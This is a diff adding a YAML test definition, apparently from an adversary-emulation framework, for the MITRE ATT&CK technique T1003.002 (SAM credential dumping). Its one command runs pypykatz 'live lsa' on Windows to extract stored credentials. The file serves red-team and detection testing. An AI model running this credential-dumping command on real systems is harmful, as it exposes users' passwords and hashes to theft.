@@ -1,0 +1,20 @@
+- description: 'Parses registry hives to obtain stored credentials.
+
+
+    Will create a Python virtual environment within the External Payloads folder that
+    can be deleted manually post test execution.
+
+    '
+  id: abdf0db6-e979-10de-1c0c-bfa7a7fa3c72
+  name: Registry parse with pypykatz
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: '"PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_002\Scripts\pypykatz"
+          live lsa'
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
